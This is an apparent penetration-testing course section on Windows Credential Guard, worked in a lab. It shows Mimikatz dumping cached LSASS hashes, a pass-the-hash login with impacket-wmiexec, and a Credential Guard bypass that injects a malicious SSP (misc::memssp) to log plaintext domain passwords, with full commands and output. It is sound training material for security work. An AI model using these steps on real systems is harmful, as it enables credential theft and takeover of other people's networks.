15.3.5. Windows Credential Guard

Up to this point we have dealt with hashes that belonged to local accounts. However, we may encounter other types of accounts, including Windows domain1 accounts. We'll discuss the inner workings of domain authentication in later modules, but for now we should demonstrate how the operating system stores the password hash of Windows users that log in with a domain account on a Windows device. If we're able to obtain this hash, we could either crack it or use it in a pass-the-hash attack.

Unlike local account hashes which are stored in the SAM, credential information such as domain hashes are stored in the memory of the lsass.exe process. Fortunately, Mimikatz can locate these stored credentials for us. Similar to our previous test-case using Mimikatz we will need to run it as Administrator (or higher) and have the SeDebugPrivilege access right enabled.

Let's start by using Mimikatz (located at C:\tools\mimikatz\mimikatz.exe) to obtain hashes for a domain user. In order to obtain hashes from a domain user, we'll need to log in to a system using domain credentials. Let's RDP into CLIENTWK246 as the CORP\Administrator user with the QWERTY!@# password.

kali@kali:~$ xfreerdp /u:"CORP\\Administrator" /p:"QWERTY123\!@#" /v:192.168.50.246 /dynamic-resolution    

    Listing 58 - Logging in to the CLIENTWK246 machine as a Domain Administrator

Now that we've connected, LSASS should have cached the domain user's information in memory. Now let's log out by right-clicking on the Windows icon in the taskbar and choosing Shut down or sign out -> Sign out.

To dump the cached credentials using Mimikatz, we'll RDP into CLIENTWK246 as offsec, which is a local administrator, and enter lab as the password.

We'll start the Windows Terminal as administrator by clicking on the Windows icon in the taskbar and typing "terminal". We'll right-click on Terminal and select the Run as Administrator and confirm the User Account Control (UAC) popup window by clicking Yes.

With the terminal open, let's navigate to C:\tools\mimikatz\ folder and run mimikatz.exe. Once Mimikatz is launched, we'll enable SeDebugPrivilege for our local user and then dump all the available credentials with sekurlsa::logonpasswords.

PS C:\Users\offsec> cd C:\tools\mimikatz\
PS C:\tools\mimikatz> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Oct 20 2023 07:20:39
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 5795018 (00000000:00586cca)
Session           : RemoteInteractive from 6
User Name         : offsec
Domain            : CLIENTWK246
Logon Server      : CLIENTWK246
Logon Time        : 9/19/2024 2:08:43 AM
SID               : S-1-5-21-180219712-1214652076-1814130762-1002
        msv :
         [00000003] Primary
         * Username : offsec
         * Domain   : CLIENTWK246
         * NTLM     : 2892d26cdf84d7a70e2eb3b9f05c425e
         * SHA1     : a188967ac5edb88eca3301f93f756ca8e94013a3
         * DPAPI    : a188967ac5edb88eca3301f93f756ca8
        tspkg :
        wdigest :       KO
        kerberos :
         * Username : offsec
         * Domain   : CLIENTWK246
         * Password : (null)
        ssp :
        credman :
        cloudap :
...
Authentication Id : 0 ; 5468350 (00000000:005370be)
Session           : RemoteInteractive from 5
User Name         : Administrator
Domain            : CORP
Logon Server      : SERVERWK248
Logon Time        : 9/19/2024 2:08:28 AM
SID               : S-1-5-21-1711441587-1152167230-1972296030-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : CORP
         * NTLM     : 160c0b16dd0ee77e7c494e38252f7ddf
         * SHA1     : 2b26e304f13c21b8feca7dcedb5bd480464f73b4
         * DPAPI    : 8218a675635dab5b43dca6ba9df6fb7e
        tspkg :
        wdigest :       KO
        kerberos :
         * Username : Administrator
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :
        cloudap :

    Listing 59 - Obtaninig the cached NTLM hash for the CORP\Administrator user

This output shows that we obtained the local offsec user's credential information as expected. However, we also gained access to the Administrator user's information from the CORP.COM domain.

Using this information, we can implement a pass-the-hash attack and gain access to the SERVERWK248 (192.168.50.248) machine.

kali@kali:~$ impacket-wmiexec -debug -hashes 00000000000000000000000000000000:160c0b16dd0ee77e7c494e38252f7ddf CORP/Administrator@192.168.50.248
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[*] SMBv3.0 dialect used
[+] Target system is 192.168.50.248 and isFQDN is False
[+] StringBinding: SERVERWK248[64285]
[+] StringBinding: 192.168.50.248[64285]
[+] StringBinding chosen: ncacn_ip_tcp:192.168.50.248[64285]
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>

    Listing 60 - Gaining access to the SERVERWK248 machine as CORP\Administrator

Penetration testers (and attackers) often use credential hashes to escalate privileges in enterprise networks. Because of this Microsoft has introduced several mitigations to attempt to combat this.

Virtualization-based Security (VBS)2 is a software technology which takes advantage of the hardware virtualization features that modern CPUs provide. These features can be used to, among other things, create and isolate secure regions of memory which become the root of trust of the operating system.

VBS runs a hypervisor3 on the physical hardware rather than running on the operating system. A hypervisor is a software component that uses hardware virtualization features provided by the CPU in order to create and manage virtual machines.

Specifically, VBS is implemented through Hyper-V4, Microsoft's native hypervisor. In addition, Microsoft built the Virtual Secure Mode (VSM)5 which is a set of hypervisor capabilities offered to the Hyper-V partitions.

Although an in-depth discussion of the technical implementation of VBS and VSM is outside of the scope for this module, we should explain how this impacts us with regards to password attacks.

VSM creates isolated regions in memory where the operating system can store highly-sensitive information and system security assets. These regions can only be accessed through the hypervisor which runs at higher privileges than even the kernel, meaning that even if we were to elevate our privileges to SYSTEM, we would still not be able to access these regions.

VSM maintains this isolation through what is known as Virtual Trust Levels (VTLs)6. Each VTL represents a separate isolated memory region and currently Microsoft supports up to 16 levels, ranked from least privileged, VTL0, to VTL1, with VTL1 having more privileges than VTL0 and so on. As of the writing of this module Windows uses two VTLs:

    VTL0 (VSM Normal Mode): Contains the Windows environment that hosts regular user-mode processes as well as a normal kernel (nt) and kernel-mode data.
    VTL1 (VSM Secure Mode): Contains an isolated Windows environment used for critical functionalities.

The user-mode in VTL1 is known as Isolated User-Mode (IUM)7, which consists of IUM processes known as Trusted Processes, Secure Processes, or Trustlets.

Microsoft has used VSM as a base for several mitigations including Device Guard, virtual TPMs and Credential Guard.

These security features premiered with Windows 10 and Windows Server 2016, however, they were not enabled by default. Because of this, the vast majority of machines encountered in an enterprise environment d0 not have them enabled. With the recent pivot from Microsoft to prioritize security above all8 these security mitigations are enabled by default on modern Windows installations.

As of the time of writing, if machines are simply updated rather than freshly installed the state of the security mitigations carry over. For example, if these security mitigations were previously disabled, they will be remain disabled after an update.

In this Module, we'll focus on Credential Guard9 mitigation. When enabled, the Local Security Authority (LSASS) environment runs as a trustlet in VTL1 named LSAISO.exe (LSA Isolated) and communicates with the LSASS.exe process running in VTL0 through an RCP channel.

Mimikatz can peruse the memory of the LSASS process and retrieve cached hashes, credentials and information. With the new process running in VTL1, all the cached hashes and credential information is stored there, rather than in the memory of the LSASS process, meaning we can't access it.

Let's try to see what happens when we try to dump all available credentials using Mimikatz on the CLIENTWK245 machine which has Credential Guard enabled.

Just as we did previously, we'll first RDP to CLIENTWK245 as CORP\Administrator with a password of QWERTY!@#.

kali@kali:~$ xfreerdp /u:"CORP\\Administrator" /p:"QWERTY123\!@#" /v:192.168.50.245 /dynamic-resolution    

    Listing 61 - Logging in to the CLIENTWK245 machine as a Domain Administrator

With the logon session successfully established, we'll close the current RDP window and connect to the CLIENTWK245 machine once again. This time, we'll use the offsec user, which is a local administrator, with the lab password.

We will start the Windows Terminal as administrator by clicking on the Windows icon in the taskbar and typing "terminal". We'll right-click on Terminal and select the Run as Administrator, and confirm the User Account Control (UAC) popup window by clicking on Yes.

To start off we want to confirm that Credential Guard is running on our machine. We can do this through the Get-ComputerInfo[^patt_gci] powershell cmdlet.

PS C:\Users\offsec> Get-ComputerInfo

WindowsBuildLabEx                                       : 22621.1.amd64fre.ni_release.220506-1250
WindowsCurrentVersion                                   : 6.3
WindowsEditionId                                        : Enterprise
...
HyperVisorPresent                                       : True
HyperVRequirementDataExecutionPreventionAvailable       :
HyperVRequirementSecondLevelAddressTranslation          :
HyperVRequirementVirtualizationFirmwareEnabled          :
HyperVRequirementVMMonitorModeExtensions                :
DeviceGuardSmartStatus                                  : Off
DeviceGuardRequiredSecurityProperties                   : {BaseVirtualizationSupport, SecureBoot}
DeviceGuardAvailableSecurityProperties                  : {BaseVirtualizationSupport, SecureBoot, DMAProtection, SecureMemoryOverwrite...}
DeviceGuardSecurityServicesConfigured                   : {CredentialGuard, HypervisorEnforcedCodeIntegrity, 3}
DeviceGuardSecurityServicesRunning                      : {CredentialGuard, HypervisorEnforcedCodeIntegrity}
DeviceGuardCodeIntegrityPolicyEnforcementStatus         : EnforcementMode
DeviceGuardUserModeCodeIntegrityPolicyEnforcementStatus : AuditMode

    Listing 62 - Verifying that Credential Guard is enabled

As we can see from the above output, one of the mitigations enabled under DeviceGuardSecurityServicesRunning is CredentialGuard.

With the terminal open we'll navigate to C:\tools\mimikatz\ and run mimikatz.exe. Once Mimikatz is launched, we'll enable the SeDebugPrivilege for our local user and dump all the available credentials with sekurlsa::logonpasswords.

PS C:\Users\offsec> cd C:\tools\mimikatz\
PS C:\tools\mimikatz> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Oct 20 2023 07:20:39
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
...
Authentication Id : 0 ; 4214404 (00000000:00404e84)
Session           : RemoteInteractive from 4
User Name         : Administrator
Domain            : CORP
Logon Server      : SERVERWK248
Logon Time        : 9/19/2024 4:39:07 AM
SID               : S-1-5-21-1711441587-1152167230-1972296030-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : CORP
           * LSA Isolated Data: NtlmHash
             KdfContext: 7862d5bf49e0d0acee2bfb233e6e5ca6456cd38d5bbd5cc04588fbd24010dd54
             Tag       : 04fe7ed60e46f7cc13c6c5951eb8db91
             AuthData  : 0100000000000000000000000000000001000000340000004e746c6d48617368
             Encrypted : 6ad536994213cea0d0b4ff783b8eeb51e5a156e058a36e9dfa8811396e15555d40546e8e1941cbfc32e8905ff705181214f8ec5c
         * DPAPI    : 8218a675635dab5b43dca6ba9df6fb7e
        tspkg :
        wdigest :       KO
        kerberos :
         * Username : Administrator
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :
        cloudap :
...

    Listing 63 - Looking at the information obtained by Mimikatz for the CORP\Administrator user

The output shows that while we know the Administrator user of the CORP.COM domain has logged into this box, we can't obtain the cached hashes because the LSASS process only has access to this information after it has been encrypted by the LSAISO process.

It is important to note that Credential Guard is only designed to protect non-local users. This means that we are still able to obtain NTLM hashes for the local users on this machine.

In order to overcome this mitigation we have to take a different approach. Given that we can't retrieve cached hashes and credentials, we must change our focus. Instead of trying to get this information after a user has already logged into the box, we could attempt to intercept the credentials while a user is logging in.

Microsoft provides quite a few authentication mechanisms10 as part of the Windows operating system such as Local Security Authority (LSA) Authentication, Winlogon, Security Support Provider Interfaces (SSPI), etc.

Specifically, SSPI is foundational as it is used by all applications and services that require authentication. For example, when two Windows computers or devices need to be authenticated in order to securely communicate, the requests made for authentication are routed to the SSPI which then handles the actual authentication.

By default, Windows provides several Security Support Providers (SSP) such as Kerberos Security Support Provider, NTLM Security Support Provider, etc. these are incorporated into the SSPI as DLLs and when authentication happens the SSPI decides which one to use.

What is important to know is that we can register multiple SSPs11 through the AddSecurityPackage12 API.

Additionally the SSP can also be registered through the HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Security Packages registry key. Each time the system starts up, the Local Security Authority (lsass.exe) loads the SSP DLLs present in the list pointed to by the registry key.

What this means is that if we were to develop our own SSP and register it with LSASS, we could maybe force the SSPI to use our malicious Security Support Provider DLL for authentication.

Fortunately for us, Mimikatz already supports this with memssp13, which not only provides the required Security Support Provider (SSP) functionality but injects it directly into the memory of the lsass.exe process without dropping any DLLs on disk.

The Mimikatz SSP takes advantage of the fact that a SSP is called with plaintext credentials through the SSPI allowing us to intercept them directly without needing to resort to a hash.

With all the theory covered, let's try to see how we can implement this attack using Mimikatz.

Going back to our RDP session on the CLIENTWK245 machine, we had just attempted to dump the cached hash of the CORP\Administrator user which did not work because Credential Guard was enabled.

Let's try to inject an SSP instead using the misc::memssp command.

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # misc::memssp
Injected =)

    Listing 64 - Injecting a malicious SSP using Mimikatz

The output shows that the SSP has been injected.

At this point, we have two options, we can either be patient and wait for another user to remotely connect to the machine or we can resort to additional techniques such as social engineering to coerce someone to log in.

For our current test case, we will simply close the current RDP session and open a new one as the CORP\Administrator user with the QWERTY!@# password.

kali@kali:~$ xfreerdp /u:"CORP\\Administrator" /p:"QWERTY123\!@#" /v:192.168.50.245 /dynamic-resolution    

    Listing 65 - Logging in to the CLIENTWK245 machine as a Domain Administrator

After we successfully authenticate to the machine over RDP, we close the current RDP window and connect to the CLIENTWK245 machine once more to investigate the results of our malicious SSP. This time we will use the offsec user, which is a local administrator, with the lab password.

When injecting a SSP into LSASS using Mimikatz, the credentials will be saved in a log file, C:\Windows\System32\mimilsa.log.

We'll start the Windows Terminal as administrator by clicking on the Windows icon in the taskbar and typing "terminal". We'll right click on Terminal and select the Run as Administrator, then confirm the User Account Control (UAC) popup window by clicking Yes.

With the terminal opened, we will attempt to check the contents of the mimilsa.log file.

PS C:\Users\offsec> type C:\Windows\System32\mimilsa.log
[00000000:00aeb773] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
[00000000:00aebd86] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
[00000000:00aebf6f] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
[00000000:00af2311] CORP\Administrator  QWERTY123!@#
[00000000:00404e84] CORP\Administrator  Šd
[00000000:00b16d69] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
[00000000:00b174fa] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
[00000000:00b177a7] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
[00000000:00b1dd77] CLIENTWK245\offsec  lab
[00000000:00b1de21] CLIENTWK245\offsec  lab

    Listing 66 - Checking the contents of the mimilsa.log file

The file contents indicate that we were able to successfully capture the plaintext credentials for the CORP\Administrator user.

In this section, we covered some of the more recent mitigations introduced by Microsoft in the form of Credential Guard. We used Mimikatz to dump cached credentials when Credential Guard was enabled and when it was disabled. Finally, we circumvented the mitigation by injecting a Security Support Provider (SSP) through Mimikatz and obtained plaintext passwords for users that logged into the system.